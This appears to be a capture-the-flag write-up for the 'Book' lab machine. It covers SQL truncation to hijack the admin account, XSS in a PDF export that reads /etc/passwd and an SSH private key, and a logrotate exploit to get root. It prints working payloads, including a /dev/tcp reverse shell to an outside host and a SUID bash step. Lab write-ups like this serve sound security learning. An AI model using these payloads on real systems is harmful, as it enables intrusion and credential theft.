## Synopsis

Book is a medium difficulty Linux machine hosting a Library application. It allows users to sign up
and add books, as well as provide feedback. The back-end database is found to be vulnerable to
SQL truncation, which is leveraged to register an account as admin and escalate privileges. The
admin panel contains additional functionality to export PDFs, which is exploited through XSS to
gain SSH access. Finally, misconfigured logs are exploited to get root.

## Reconaissance

### HTTP

landing page direct into login form with including register page

![](/assets/img/book/1.png)


make new account

![](/assets/img/book/2.png)


inside the pages collections.php we can identify file upload

![](/assets/img/book/3.png)


tried upload file.txt into target and fireup burpsuite to see what happen in the background.

get notif after uploading my file

```javascript
<script>alert("Thanks for the submission. We will evaluate and update the list");window.location="/collections.php";</script>
```

and notice if my file doesnt exist in this page, we cannot do anything

keep move on into feroxbuster for gather more information

```

found the admin pages and check the source code and cant find anything usefull in admin pages.

![](/assets/img/book/4.png)

back to index.php and check the source code will see javascript for handle validate form

```javascript
<script>
  if (document.location.search.match(/type=embed/gi)) {
    window.parent.postMessage("resize", "*");
  }
function validateForm() {
  var x = document.forms["myForm"]["name"].value;
  var y = document.forms["myForm"]["email"].value;
  if (x == "") {
    alert("Please fill name field. Should not be more than 10 characters");
    return false;
  }
  if (y == "") {
    alert("Please fill email field. Should not be more than 20 characters");
    return false;
  }
}
</script>
```

the thing is we logged in using email, and the message was `shouldn't be more than 20 characters` what if we register more than 20 characters. im telling you this target affected of `sql truncation`. in short sql truncation is vulnerability occurs when a database truncates the user input due to a restriction on the length. attackers can log in as some other user, such as an admin, with their own register password.
you can see the sql truncation poc in [here](https://resources.infosecinstitute.com/topic/sql-truncation-attack/).

fireup burpsuite for gather information if admin user has registered or not

![](/assets/img/book/5.png)

as you can see admin user has been registered and from now we can change the password of admin user.

going to register page and given space on email using payload below

```
name=bunny666&email=admin@book.htb      AA&password=1
```

relogin with new credentials as admin

![](/assets/img/book/7.png)

we success login as admin, in the picture below we can see that the user bunnys666 can change the password from the admin@book.htb mail

![](/assets/img/book/9.png)

continuing process enumeration to collection feature, at this stage I can analyze that the upload page on the user will be sent directly to the admin page. we can find the txt file that we uploaded earlier.

## XSS

identified xss on the book collection section on user, sending the payload with basic xss 

```javascript
<img src="x" onerror="document.write('test')" />
```

![](/assets/img/book/13.png)

check the admin page on collection feature

![](/assets/img/book/11.png)

after uploading the file with xss we get a pdf file as output

![](/assets/img/book/10.png)

for read file /etc/passwd using payload below for gather what user have shell inside target

```javascript
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///etc/passwd");x.send();</script>
```

![](/assets/img/book/14.png)


rewrite the payload for finding ssh user in reader directory ('/home/reader/.ssh/id_rsa')

```javascript
<script>x=new XMLHttpRequest;x.onload=function(){document.write(this.responseText)};x.open("GET","file:///home/reader/.ssh/id_rsa");x.send();</script>
```

![](/assets/img/book/15.png)

after get the id_rsa key it should be convert into pdf to text before we use the key.
to convert, it turns out that python has a library to convert pdf to txt, we can use `pdf2text`

```
pdf2txt.py 83846.pdf_output/83846.pdf --outfile id_rsa
```

login via ssh as reader and collect user.txt

### Privilege Escalation

during enumeration process, I see logrotate on linpeas output

![](/assets/img/book/17.png)

then i uploaded pspy to see the process in the background

![](/assets/img/book/18.png)

and we can find the access log in the backup folder

![](/assets/img/book/19.png)


basically logrotate is the process that renames a current log file (e.g auth.log becomes auth.log.1) and set up a new log files.

pre-conditions  for privelege escalation in target:

* logrotate has to be executed as root
* the logpath need to be in control of the attacker
* any option that creates file is set in the logrotate configuration

and now we can do privilege escalation, you can grab the exploit [here](https://github.com/whotwagner/logrotten). 

prepare for our payload in ssh session

create a file and given name payload with contain:

```bash
(for suid)
cp /bin/bash ~/backups; chmod u+s /bin/bash

(for reverseshell)
bash -i >& /dev/tcp/10.10.14.5/9000 0>&1
```

compiling the exploit on our host and send back into reader using wget or curl command.

execute exploit with following prompt:

```bash
./exploit -p ./payload /home/reader/backups/access.log
```

open another session via ssh, and execute this command below to trigger our exploit

```
echo "1" >> access.log
```

![](/assets/img/book/20.png)

now execute `/bin/bash -p` you will receive root access
